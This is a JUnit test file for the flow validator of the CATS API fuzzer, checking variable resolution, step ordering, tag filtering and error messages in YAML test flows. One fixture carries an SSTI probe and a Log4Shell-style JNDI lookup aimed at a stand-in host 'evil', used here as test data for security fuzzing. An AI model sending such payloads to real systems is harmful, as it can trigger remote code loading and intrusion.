package com.endava.cats.fuzzer.special;

import com.endava.cats.exception.CatsException;
import com.endava.cats.fuzzer.special.FunctionalFlowDocument.FunctionalFlowStep;
import io.quarkus.test.junit.QuarkusTest;
import org.assertj.core.api.Assertions;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

@QuarkusTest
class FunctionalFlowValidatorTest {
    private static final Map<String, String> NO_ENVIRONMENT_VARIABLES = Map.of();

    @Test
    void shouldAcceptValidFlowWithGlobalsEnvForEachSavesStepRefsAndSecurityPayloads() {
        FunctionalFlowDocument doc = FunctionalFlowParser.parseContent("""
                variables:
                  route: "MockRoute"
                  derivedRoute: "${route}-v2"
                headers:
                  Authorization: "Bearer ${authToken}"
                steps:
                  - name: login
                    POST: /login
                    headers:
                      Authorization: null
                    body:
                      secret: "${ENV_SECRET}"
                      sstiProbe: "${7*7}"
                      jndiProbe: "${jndi:ldap://evil/a}"
                    save:
                      authToken: token
                  - name: createOrders
                    POST: /orders
                    forEach:
                      - { currency: "EUR", amount: 10 }
                      - { currency: "USD", amount: 20 }
                    body:
                      route: "${derivedRoute}"
                      currency: "${currency}"
                      amount: "${amount}"
                      prevToken: "${steps.login.response.token}"
                    fuzz:
                      fields: [currency]
                      payloads: ["${notAVarInFuzz}"]
                    expect:
                      status: 201
                      that:
                        - "$prev.status == 200"
                """);

        Assertions.assertThatCode(() -> FunctionalFlowValidator.validate(doc, doc.steps(), Map.of("ENV_SECRET", "top-secret")))
                .doesNotThrowAnyException();
    }

    @Test
    void shouldFailOnUndefinedVariableInGlobalVariablesOrSteps() {
        FunctionalFlowDocument doc = FunctionalFlowParser.parseContent("""
                variables:
                  brokenGlobal: "${missingGlobal}"
                steps:
                  - name: auth01
                    POST: /payments/${missingPathVar}
                    body:
                      card: "${missingCard}"
                """);

        List<FunctionalFlowStep> steps = doc.steps();
        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(doc, steps, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("Variable 'brokenGlobal' references undefined variable '${missingGlobal}'")
                .hasMessageContaining("Step 'auth01' references undefined variable '${missingPathVar}'")
                .hasMessageContaining("Step 'auth01' references undefined variable '${missingCard}'");
    }

    @Test
    void shouldFailWhenStepDependsOnVariableSavedByTagExcludedStep() {
        FunctionalFlowDocument doc = FunctionalFlowParser.parseContent("""
                steps:
                  - name: auth01Authorize
                    tags: [psp]
                    POST: /authorize
                    save:
                      authReference: reference
                  - name: cap01Capture
                    tags: [adapter]
                    POST: /capture
                    body:
                      reference: "${authReference}"
                """);

        List<FunctionalFlowStep> adapterOnly = doc.steps().stream()
                .filter(s -> s.matchesTags(List.of("adapter"), List.of()))
                .toList();

        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(doc, adapterOnly, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("Step 'cap01Capture' requires variable '${authReference}'")
                .hasMessageContaining("saved by step 'auth01Authorize'")
                .hasMessageContaining("excluded by step tag filters");
    }

    @Test
    void shouldFailWhenStepReferencesTagExcludedStepOutputOrPrev() {
        FunctionalFlowDocument doc = FunctionalFlowParser.parseContent("""
                steps:
                  - name: seed
                    tags: [adapter]
                    POST: /seed
                  - name: auth01Authorize
                    tags: [psp]
                    POST: /authorize
                  - name: cap01Capture
                    tags: [adapter]
                    POST: /capture
                    body:
                      ref: "${steps.auth01Authorize.response.id}"
                      prevBody: "$prev.response.id"
                """);

        List<FunctionalFlowStep> adapterOnly = doc.steps().stream()
                .filter(s -> s.matchesTags(List.of("adapter"), List.of()))
                .toList();

        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(doc, adapterOnly, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("references 'steps.auth01Authorize' from step 'auth01Authorize' which was excluded")
                .hasMessageContaining("references '$prev', but preceding step 'auth01Authorize' was excluded");
    }

    @Test
    void shouldFailWhenVariableUsedBeforeItIsSavedByLaterStepOrPrevUsedOnFirstStep() {
        FunctionalFlowDocument doc = FunctionalFlowParser.parseContent("""
                steps:
                  - name: firstStep
                    POST: /first
                    body:
                      ref: "${laterId}"
                      prevRef: "$prev.response.id"
                  - name: secondStep
                    POST: /second
                    save:
                      laterId: id
                """);

        List<FunctionalFlowStep> steps = doc.steps();
        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(doc, steps, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("uses variable '${laterId}' before it is saved by later step 'secondStep'")
                .hasMessageContaining("references '$prev' but no preceding step will execute");
    }

    @Test
    void shouldAllowChildSuppliedGlobalVariablesSelfSavedExpectAndDetectCyclesPartialForEachAndDocCorrelations() {
        FunctionalFlowDocument validDoc = FunctionalFlowParser.parseContent("""
                variables:
                  derivedPath: "/api/${route}/pay"
                  route: "MockECOM"
                steps:
                  - name: createOrder
                    POST: "${derivedPath}"
                    save:
                      orderId: id
                    expect:
                      status: 201
                      that:
                        - "response.selfLink contains '${orderId}'"
                """);
        Assertions.assertThatCode(() -> FunctionalFlowValidator.validate(validDoc, validDoc.steps(), Map.of()))
                .doesNotThrowAnyException();

        FunctionalFlowDocument cyclicVarsDoc = FunctionalFlowParser.parseContent("""
                variables:
                  a: "${b}"
                  b: "${a}"
                steps:
                  - name: s1
                    POST: /items
                """);
        List<FunctionalFlowStep> cyclicSteps = cyclicVarsDoc.steps();
        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(cyclicVarsDoc, cyclicSteps, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("Cyclic variable reference detected");

        FunctionalFlowDocument partialForEachAndCorrDoc = FunctionalFlowParser.parseContent("""
                correlate:
                  - paths: ["/items"]
                    when: "kind == 'A'"
                    set:
                      owner: "${missingCorrVar}"
                steps:
                  - name: partialRows
                    POST: /items
                    forEach:
                      - { currency: "EUR", note: "ok" }
                      - { currency: "USD" }
                    body:
                      currency: "${currency}"
                      note: "${note}"
                """);
        List<FunctionalFlowStep> partialForEachSteps = partialForEachAndCorrDoc.steps();
        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(partialForEachAndCorrDoc, partialForEachSteps, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("undefined variable '${missingCorrVar}'")
                .hasMessageContaining("undefined variable '${note}'");

        FunctionalFlowDocument templateCorrAndSameRowDoc = FunctionalFlowParser.parseContent("""
                correlate:
                  - paths: ["PATCH /items/{itemId}"]
                    when: "active == false"
                    set:
                      reason: "${missingTemplateCorrVar}"
                steps:
                  - name: createItem
                    POST: /items
                    forEach:
                      - { prefix: "A", code: "${prefix}-1" }
                    body:
                      code: "${code}"
                    save:
                      itemId: "$steps.createItem.response.id"
                  - name: patchItem
                    PATCH: /items/${itemId}
                    body:
                      active: false
                """);
        List<FunctionalFlowStep> templateCorrelationSteps = templateCorrAndSameRowDoc.steps();
        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(templateCorrAndSameRowDoc, templateCorrelationSteps, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("undefined variable '${missingTemplateCorrVar}'")
                .hasMessageNotContaining("prefix")
                .hasMessageNotContaining("createItem");
    }

    @Test
    void shouldValidateHeadersRefAndOmitVariableReferences() {
        FunctionalFlowDocument validDoc = FunctionalFlowParser.parseContent("""
                variables:
                  docHeaders:
                    X-Doc: "1"
                  webhookHeaders:
                    X-Sig: "sig"
                  omitFields: ["route", "headers.Authorization"]
                headers:
                  Authorization: "Bearer ${lateToken}"
                steps:
                  - name: sendWebhook
                    POST: /webhooks
                    headers: "${webhookHeaders}"
                    omit: "${omitFields}"
                    save:
                      lateToken: token
                """);
        Assertions.assertThatCode(() -> FunctionalFlowValidator.validate(validDoc, validDoc.steps(), Map.of()))
                .doesNotThrowAnyException();

        FunctionalFlowDocument invalidDoc = FunctionalFlowParser.parseContent("""
                variables:
                  notAMap: "plain-string"
                headers: "not-a-var-ref"
                steps:
                  - name: badHeadersAndOmit
                    POST: /webhooks
                    headers: "${notAMap}"
                    omit: ["${missingOmitVar}"]
                """);
        List<FunctionalFlowStep> steps = invalidDoc.steps();
        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(invalidDoc, steps, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("Document 'headers' must be a map or a standalone '${variable}' reference")
                .hasMessageContaining("Step 'badHeadersAndOmit' 'headers' variable '${notAMap}' must be a map/object")
                .hasMessageContaining("Step 'badHeadersAndOmit' references undefined variable '${missingOmitVar}'");
    }

    @Test
    void shouldAllowOptionalPlaceholdersWhenUnsetOrNullAndStillRejectInvalidTypes() {
        FunctionalFlowDocument validOptionalDoc = FunctionalFlowParser.parseContent("""
                variables:
                  explicitNull: null
                  nestedFromOptional:
                    route: "${unsetRoute?}"
                steps:
                  - name: optionalStep
                    POST: /payments
                    headers: "${unsetHeaders?}"
                    query:
                      filter: "${explicitNull?}"
                    body:
                      processingRouteIdentifier: "${unsetRoute?}"
                      note: "prefix-${unsetSuffix?}"
                    omit: ["${unsetOmit?}"]
                """);
        Assertions.assertThatCode(() -> FunctionalFlowValidator.validate(validOptionalDoc, validOptionalDoc.steps(), Map.of()))
                .doesNotThrowAnyException();

        FunctionalFlowDocument badOptionalHeadersTypeDoc = FunctionalFlowParser.parseContent("""
                variables:
                  badHeaders: 123
                steps:
                  - name: badOptionalHeaders
                    POST: /payments
                    headers: "${badHeaders?}"
                """);
        List<FunctionalFlowStep> steps = badOptionalHeadersTypeDoc.steps();
        Assertions.assertThatThrownBy(() -> FunctionalFlowValidator.validate(badOptionalHeadersTypeDoc, steps, NO_ENVIRONMENT_VARIABLES))
                .isInstanceOf(CatsException.class)
                .hasMessageContaining("Step 'badOptionalHeaders' 'headers' variable '${badHeaders}' must be a map/object");
    }
}
